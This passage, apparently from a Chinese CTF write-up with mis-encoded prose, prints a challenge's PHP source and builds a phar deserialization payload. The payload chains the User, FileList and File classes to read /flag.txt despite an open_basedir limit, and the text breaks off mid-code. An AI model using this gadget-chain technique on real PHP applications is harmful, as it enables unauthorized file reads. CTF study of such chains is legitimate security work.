class="token variable">$this</span><span class="token operator">-></span><span class="token property">db</span><span class="token operator">-></span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span><span class="token operator">-></span><span class="token function">bind_param</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"s"</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span><span class="token operator">-></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span><span class="token operator">-></span><span class="token function">store_result</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$count</span> <span class="token operator">=</span> <span class="token variable">$stmt</span><span class="token operator">-></span><span class="token property">num_rows</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$count</span> <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">add_user</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token function">user_exist</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$password</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"SiAchGHmFx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">db</span><span class="token operator">-></span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span><span class="token operator">-></span><span class="token function">bind_param</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ss"</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span><span class="token operator">-></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">verify_user</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token function">user_exist</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$password</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"SiAchGHmFx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">db</span><span class="token operator">-></span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"SELECT `password` FROM `users` WHERE `username` = ?;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span><span class="token operator">-></span><span class="token function">bind_param</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"s"</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span><span class="token operator">-></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span><span class="token operator">-></span><span class="token function">bind_result</span><span class="token punctuation">(</span><span class="token variable">$expect</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span><span class="token operator">-></span><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$expect</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$expect</span> <span class="token operator">===</span> <span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">db</span><span class="token operator">-></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">FileList</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$files</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$results</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$funcs</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">files</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">results</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">funcs</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$filenames</span> <span class="token operator">=</span> <span class="token function">scandir</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token function">array_search</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">,</span> <span class="token variable">$filenames</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$filenames</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token function">array_search</span><span class="token punctuation">(</span><span class="token string double-quoted-string">".."</span><span class="token punctuation">,</span> <span class="token variable">$filenames</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$filenames</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$filenames</span> <span class="token keyword">as</span> <span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$file</span><span class="token operator">-></span><span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$path</span> <span class="token operator">.</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">array_push</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">files</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">results</span><span class="token punctuation">[</span><span class="token variable">$file</span><span class="token operator">-></span><span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__call</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$args</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">array_push</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">funcs</span><span class="token punctuation">,</span> <span class="token variable">$func</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">files</span> <span class="token keyword">as</span> <span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">results</span><span class="token punctuation">[</span><span class="token variable">$file</span><span class="token operator">-></span><span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$func</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token operator">-></span><span class="token variable">$func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$table</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'&lt;div id="container" class="container">&lt;div class="table-responsive">&lt;table id="table" class="table table-bordered table-hover sm-font">'</span><span class="token punctuation">;</span>        <span class="token variable">$table</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">'&lt;thead>&lt;tr>'</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">funcs</span> <span class="token keyword">as</span> <span class="token variable">$func</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$table</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">'&lt;th scope="col" class="text-center">'</span> <span class="token operator">.</span> <span class="token function">htmlentities</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'&lt;/th>'</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$table</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">'&lt;th scope="col" class="text-center">Opt&lt;/th>'</span><span class="token punctuation">;</span>        <span class="token variable">$table</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">'&lt;/thead>&lt;tbody>'</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">results</span> <span class="token keyword">as</span> <span class="token variable">$filename</span> <span class="token operator">=></span> <span class="token variable">$result</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$table</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">'&lt;tr>'</span><span class="token punctuation">;</span>            <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$result</span> <span class="token keyword">as</span> <span class="token variable">$func</span> <span class="token operator">=></span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$table</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">'&lt;td class="text-center">'</span> <span class="token operator">.</span> <span class="token function">htmlentities</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'&lt;/td>'</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token variable">$table</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">'&lt;td class="text-center" filename="'</span> <span class="token operator">.</span> <span class="token function">htmlentities</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'">&lt;a href="#" class="download">ä¸‹è½½&lt;/a> / &lt;a href="#" class="delete">åˆ é™¤&lt;/a>&lt;/td>'</span><span class="token punctuation">;</span>            <span class="token variable">$table</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">'&lt;/tr>'</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">echo</span> <span class="token variable">$table</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">File</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">open</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span> <span class="token operator">=</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$size</span> <span class="token operator">=</span> <span class="token function">filesize</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$units</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">' B'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">' KB'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">' MB'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">' GB'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">' TB'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$size</span> <span class="token operator">>=</span> <span class="token number">1024</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token variable">$size</span> <span class="token operator">/=</span> <span class="token number">1024</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token function">round</span><span class="token punctuation">(</span><span class="token variable">$size</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token variable">$units</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">detele</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>ä»£ç æ ¸å¿ƒå°±åœ¨<code>class.php</code>äº†</p><p>å…ˆçœ‹åˆ°loginå’Œregisterä¸¤ä¸ªæ–‡ä»¶ï¼Œç”¨äº†PDOï¼Œæ³¨å…¥ç›¸å½“å›°éš¾ï¼Œæ‰¾åˆ°åˆ°æ–‡ä»¶ä¸‹è½½åŠŸèƒ½<code>download</code>ï¼Œå¯ä»¥çœ‹åˆ°è¿™æ ·çš„ä¸€å¥ä»£ç ï¼š<code>ini_set(&quot;open_basedir&quot;, getcwd() . &quot;:/etc:/tmp&quot;);</code></p><p><strong>ini_set</strong>ï¼šå‡ºä¸ºä¸€ä¸ªé…ç½®é€‰é¡¹è®¾ç½®å€¼ï¼Œå¯ä»¥è®¾ç½®phpçš„ä¸€äº›é…ç½®ï¼Œå…¶ä¸­å°±åŒ…æ‹¬<strong>open_basedir</strong>ï¼Œç”¨æ¥é™åˆ¶å½“å‰ç¨‹åºå¯ä»¥è®¿é—®çš„ç›®å½•ã€‚å½“å‰è®¾ç½®ä¸º<code>getcwd()</code>å½“å‰ç›®å½•å’Œ<code>/etc</code>å’Œ<code>/tmp</code>ä¸‰ä¸ªç›®å½•ï¼Œè¿™å°±æ˜¯ä¸ºä»€ä¹ˆå‰é¢ä¸‹è½½ä¸äº†æ ¹ç›®å½•ä¸‹çš„<code>flag</code>äº†</p><p>å†çœ‹åˆ°<code>delete.php</code>æ–‡ä»¶ï¼Œå¹¶æ²¡æœ‰é™åˆ¶ï¼Œäºæ˜¯æˆ‘ä»¬å¯»æ‰¾å¯åˆ©ç”¨æ¡ä»¶ï¼Œé‡ç‚¹çœ‹åˆ°<code>class.php</code>ï¼Œåœ¨è¿™ä¸ªæ–‡ä»¶çš„<code>File</code>ç±»ä¸­å‘ç°äº†<code>close()</code>æ–¹æ³•ä¸­æœ‰ä¸€ä¸ª<code>file_get_contents</code>æ–¹æ³•ï¼Œæ˜æ˜¾çš„æ–‡ä»¶è¯»å–ï¼Œå†æ‰¾åˆ°ä½¿ç”¨äº†è¿™ä¸ªå‡½æ•°çš„æ–¹æ³•ï¼Œä¸éš¾å‘ç°åœ¨<code>User</code>ç±»ä¸­çš„<code>__destruct</code>æ–¹æ³•è°ƒç”¨äº†è¿™ä¸ªå‡½æ•°ï¼Œ<code>__destruct</code>æ–¹æ³•æ˜¯å½“ä¸€ä¸ªå¯¹è±¡è¢«é”€æ¯çš„æ—¶å€™æ‰è°ƒç”¨ï¼Œdelete.phpä¸­å°±å¯ä»¥è§¦å‘è¿™æ–¹æ³•ï¼Œä½†æ˜¯è¿™ä¹Ÿè¦è¿™äº›ç±»ä¸­çš„å±æ€§æˆ‘ä»¬å¯æ§æ‰èƒ½è°ƒç”¨è¿™äº›æ–¹æ³•ï¼Œäºæ˜¯è¿™é‡Œå°±å¼•å‡ºäº†<code>phar</code>ä¼ªåè®®ååºåˆ—åŒ–çš„æ“ä½œï¼Œè¯¦è§ä¸Šé¢çš„è¯´æ˜</p><p>äºæ˜¯åˆæ­¥æ„é€ payloadï¼š</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">User</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$db</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">File</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token operator">=</span><span class="token string single-quoted-string">'/flag.txt'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">db</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>ä½†æ˜¯åœ¨<code>file_get_contents</code>åæˆ‘ä»¬å¹¶æ²¡æœ‰å›æ˜¾çš„å‡½æ•°ï¼Œäºæ˜¯å°±éœ€è¦ç”¨åˆ°<code>FileList</code>ç±»ä¸­çš„<code>__destruct</code>æ–¹æ³•æ¥å›æ˜¾ï¼Œè¿™é‡Œå°±éœ€è¦å†åˆ›å»ºä¸€ä¸ª<code>FileList</code>ç±»ï¼Œä»¤å…¶ä¸­çš„<code>files</code>ä¸º<code>new File()</code>ï¼Œä½†æ˜¯è¿™é‡Œå°±åˆ›å»ºäº†ä¸¤ä¸ªç±»äº†ï¼Œæ— æ³•è¾¾åˆ°ååºåˆ—åŒ–çš„æ•ˆæœï¼Œé‚£ä¹ˆæˆ‘ä»¬å†æ¥çœ‹çœ‹å¦‚ä½•æŠŠè¿™ä¸‰ä¸ªç±»ç»™è”ç³»èµ·æ¥ï¼Œå¯ä»¥çœ‹åˆ°<code>FileList</code>ç±»ä¸­çš„<code>__call</code>æ–¹æ³•ï¼Œï¼ˆ å½“å¯¹è±¡è°ƒç”¨ä¸€ä¸ªä¸å­˜åœ¨çš„æ–¹æ³•çš„æ—¶å€™è°ƒç”¨ï¼Œ<strong>$func</strong>ï¼šè¢«è°ƒç”¨çš„æ–¹æ³•åï¼Œ<strong>$args</strong> ï¼š è¢«è°ƒç”¨æ–¹æ³•ä¸­çš„å‚æ•°ï¼Œè¿™æ˜¯ä¸ªæ•°ç»„ï¼‰ï¼Œå†çœ‹åˆ°ä¸Šé¢çš„<code>Userçš„</code>çš„<code>__destruct</code>æ–¹æ³•ï¼Œå¦‚æœæˆ‘ä»¬ä»¤<code>User</code>ç±»ä¸­çš„<code>db</code>å±æ€§ä¸º<code>FileList</code>ç±»ï¼Œè°ƒç”¨å…¶ä¸­ä¸å­˜åœ¨çš„<code>close</code>æ–¹æ³•ï¼Œå°±å¯ä»¥å®Œç¾è§¦å‘<code>FileList</code>ç±»ä¸­çš„<code>__call</code>æ–¹æ³•ï¼Œå†çœ‹åˆ°<code>__call</code>æ–¹æ³•çš„å®ç°ï¼š</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__call</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$args</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">array_push</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">funcs</span><span class="token punctuation">,</span> <span class="token variable">$func</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">files</span> <span class="token keyword">as</span> <span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">results</span><span class="token punctuation">[</span><span class="token variable">$file</span><span class="token operator">-></span><span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$func</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token operator">-></span><span class="token variable">$func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p><strong>array_push</strong>ï¼šå°†ä¸€ä¸ªæˆ–å¤šä¸ªå•å…ƒå‹å…¥æ•°ç»„çš„æœ«å°¾ï¼ˆå…¥æ ˆï¼‰</p><p><strong>foreach</strong>ï¼šéå†æ•°ç»„</p><p>çœ‹åˆ°å…¶ä¸­çš„<code>$file-&gt;$func();</code>ï¼Œå¦‚æœ<code>$func</code>ä¸º<code>close</code>ï¼Œå°±å¯ä»¥æˆåŠŸè°ƒç”¨<code>File</code>ç±»ä¸­çš„<code>close</code>æ–¹æ³•ï¼Œäºæ˜¯æ„é€ å®Œæ•´payloadï¼š</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">User</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$db</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">FileList</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$files</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$results</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$funcs</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">files</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">results</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">funcs</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">File</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token operator">=</span><span class="token string single-quoted-string">'/flag.txt'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$o</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$o</span> <span class="token operator">-></span> <span class="token property">db</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"phar.phar"</span><span class="token 